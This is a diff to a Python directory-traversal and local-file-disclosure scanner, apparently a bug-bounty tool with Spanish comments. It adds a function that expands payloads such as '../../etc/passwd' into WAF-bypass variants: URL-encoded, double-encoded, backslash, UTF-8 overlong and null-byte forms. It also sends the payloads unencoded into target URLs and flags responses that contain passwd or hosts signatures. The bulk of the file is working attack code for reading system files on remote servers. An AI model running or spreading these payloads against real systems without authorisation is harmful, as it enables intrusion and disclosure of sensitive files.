@@ -10,11 +10,11 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from colorama import Fore, Style, init
 
-# Inicializar colorama
 init(autoreset=True)
 
 
-DEFAULT_PATHS = [
+# Rutas base en texto plano
+BASE_PATHS = [
     "../../etc/passwd",
     "../../../etc/passwd",
     "../../../../etc/passwd",
@@ -28,6 +28,45 @@ DEFAULT_PATHS = [
     "../../../windows/system32/drivers/etc/hosts",
     "../../../../windows/system32/drivers/etc/hosts",
 ]
+
+
+def expand_encodings(paths):
+    """
+    Genera variantes de encoding para cada ruta base.
+    Cubre los bypasses mas habituales en bug bounty y WAFs.
+    """
+    result = list(paths)  # rutas originales primero
+
+    for path in paths:
+        variants = [
+            # URL encoding simple: ../ -> %2e%2e%2f
+            path.replace("../", "%2e%2e%2f"),
+            # Doble encoding: ../ -> %252e%252e%252f
+            path.replace("../", "%252e%252e%252f"),
+            # Encoding mixto: ../ -> ..%2f
+            path.replace("../", "..%2f"),
+            # Backslash Windows: ../ -> ..\\
+            path.replace("../", "..\\"),
+            # Backslash URL-encoded: ../ -> ..%5c
+            path.replace("../", "..%5c"),
+            # Unicode / UTF-8 overlong: ../ -> ..%c0%af
+            path.replace("../", "..%c0%af"),
+            # Unicode dotdot: ../ -> %c0%ae%c0%ae%2f
+            path.replace("../", "%c0%ae%c0%ae%2f"),
+            # Doble slash: ../ -> ../
+            path.replace("../", ".//"),
+            # Null byte (legacy PHP/CGI): aniade %00 al final
+            path + "%00",
+            path + "%00.jpg",
+        ]
+        for v in variants:
+            if v not in result:
+                result.append(v)
+
+    return result
+
+
+DEFAULT_PATHS = expand_encodings(BASE_PATHS)
 
 
 UNIX_SIGNATURES = [
@@ -47,7 +86,8 @@ WIN_SIGNATURES = [
 
 def banner():
     print(f"{Fore.CYAN}tool-lfdscanner{Style.RESET_ALL} - Local File Disclosure & Directory Traversal scanner")
-    print(f"by {Fore.GREEN}TheOffSecGirl{Style.RESET_ALL}\n")
+    print(f"by {Fore.GREEN}TheOffSecGirl{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[i] Encodings activos: plain, %2e%2e%2f, doble, backslash, unicode, null byte{Style.RESET_ALL}\n")
 
 
 def build_targets(args):
@@ -73,7 +113,7 @@ def build_targets(args):
         clean.append(t)
 
     if not clean:
-        print(f"{Fore.RED}[!] No se han proporcionado objetivos válidos.{Style.RESET_ALL}")
+        print(f"{Fore.RED}[!] No se han proporcionado objetivos validos.{Style.RESET_ALL}")
         sys.exit(1)
 
     return list(dict.fromkeys(clean))
@@ -87,32 +127,28 @@ def load_paths(args):
                 for line in f:
                     line = line.strip()
                     if line and not line.startswith("#"):
-                        paths.append(line)
+                        if line not in paths:
+                            paths.append(line)
         except OSError as e:
             print(f"{Fore.RED}[!] No se pudo leer el archivo de rutas: {e}{Style.RESET_ALL}")
-
-    # dedupe manteniendo orden
-    return list(dict.fromkeys(paths))
+    return paths
 
 
 def build_url(base, param_name, path):
-    # Si el usuario ha dejado un marcador FUZZ en la URL, se reemplaza
     if "FUZZ" in base:
-        return base.replace("FUZZ", urllib.parse.quote(path))
+        # No re-encodar: el path ya lleva su encoding especifico
+        return base.replace("FUZZ", path)
 
     parsed = urllib.parse.urlparse(base)
     query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
-
-    # Insertamos/actualizamos el parámetro de prueba
     query[param_name] = path
-
     new_query = urllib.parse.urlencode(query, doseq=True)
     new_parsed = parsed._replace(query=new_query)
     return urllib.parse.urlunparse(new_parsed)
 
 
 def response_looks_interesting(text):
-    t = text[:5000]  # limitamos para no tragarnos respuestas enormes
+    t = text[:5000]
 
     for sig in UNIX_SIGNATURES:
         if sig in t:
@@ -122,7 +158,6 @@ def response_looks_interesting(text):
         if sig in t:
             return True
 
-    # heurística básica si no hay patrones claros
     if "root:" in t and "/bin" in t:
         return True
 
@@ -179,8 +214,8 @@ def scan_target(base_url, paths, args, session, headers):
                 print(
                     f"{Fore.RED}[+] Posible LFD/Traversal en{Style.RESET_ALL} {result['url']}"
                 )
-                print(f"    path: {result['path']}")
-                print(f"    status: {result['status']}")
+                print(f"    path:    {result['path']}")
+                print(f"    status:  {result['status']}")
                 print(f"    snippet: {result['snippet']}\n")
 
     return findings
@@ -188,63 +223,18 @@ def scan_target(base_url, paths, args, session, headers):
 
 def parse_args():
     parser = argparse.ArgumentParser(
-        description="tool-lfdscanner - Escáner de Local File Disclosure y Directory Traversal."
+        description="tool-lfdscanner - Escaner de Local File Disclosure y Directory Traversal."
     )
-    parser.add_argument(
-        "-u",
-        "--url",
-        help="URL objetivo. Puede contener FUZZ como marcador de inyección.",
-    )
-    parser.add_argument(
-        "-L",
-        "--list",
-        help="Archivo con lista de objetivos (uno por línea).",
-    )
-    parser.add_argument(
-        "--paths",
-        help="Archivo con rutas de traversal personalizadas.",
-    )
-    parser.add_argument(
-        "-p",
-        "--param",
-        default="file",
-        help="Nombre del parámetro a usar cuando no se use FUZZ en la URL (por defecto: file).",
-    )
-    parser.add_argument(
-        "-t",
-        "--timeout",
-        type=int,
-        default=5,
-        help="Timeout en segundos para cada petición (por defecto: 5).",
-    )
-    parser.add_argument(
-        "-T",
-        "--threads",
-        type=int,
-        default=10,
-        help="Número de hilos por objetivo (por defecto: 10).",
-    )
-    parser.add_argument(
-        "-A",
-        "--agent",
-        default="Mozilla/5.0 (compatible; tool-lfdscanner)",
-        help="User-Agent personalizado.",
-    )
-    parser.add_argument(
-        "--insecure",
-        action="store_true",
-        help="Desactivar verificación TLS (equivalente a --insecure en curl).",
-    )
-    parser.add_argument(
-        "--json-output",
-        help="Archivo donde volcar resultados en formato JSON.",
-    )
-    parser.add_argument(
-        "-v",
-        "--verbose",
-        action="store_true",
-        help="Modo verbose.",
-    )
+    parser.add_argument("-u", "--url", help="URL objetivo. Puede contener FUZZ como marcador de inyeccion.")
+    parser.add_argument("-L", "--list", help="Archivo con lista de objetivos (uno por linea).")
+    parser.add_argument("--paths", help="Archivo con rutas de traversal personalizadas.")
+    parser.add_argument("-p", "--param", default="file", help="Parametro a usar sin FUZZ (default: file).")
+    parser.add_argument("-t", "--timeout", type=int, default=5, help="Timeout por peticion en segundos (default: 5).")
+    parser.add_argument("-T", "--threads", type=int, default=10, help="Hilos por objetivo (default: 10).")
+    parser.add_argument("-A", "--agent", default="Mozilla/5.0 (compatible; tool-lfdscanner)", help="User-Agent personalizado.")
+    parser.add_argument("--insecure", action="store_true", help="Desactivar verificacion TLS.")
+    parser.add_argument("--json-output", help="Archivo donde guardar resultados en JSON.")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verbose.")
 
     args = parser.parse_args()
 
@@ -261,21 +251,23 @@ def main():
     targets = build_targets(args)
     paths = load_paths(args)
 
+    print(f"{Fore.YELLOW}[i] Rutas de prueba cargadas: {len(paths)}{Style.RESET_ALL}\n")
+
     headers = {"User-Agent": args.agent}
     session = requests.Session()
 
     all_findings = {}
 
     for target in targets:
-        print(f"{Fore.CYAN}[*] Escanenado objetivo:{Style.RESET_ALL} {target}")
+        print(f"{Fore.CYAN}[*] Escaneando objetivo:{Style.RESET_ALL} {target}")
         findings = scan_target(target, paths, args, session, headers)
         all_findings[target] = findings
 
     total_vuln = sum(len(v) for v in all_findings.values())
     print("\n" + "-" * 60)
     print(f"{Fore.GREEN}[+] Escaneo completado.{Style.RESET_ALL}")
-    print(f"    Objetivos analizados: {len(targets)}")
-    print(f"    Posibles vulnerabilidades encontradas: {total_vuln}")
+    print(f"    Objetivos analizados:              {len(targets)}")
+    print(f"    Posibles vulnerabilidades:         {total_vuln}")
 
     if args.json_output:
         report = {
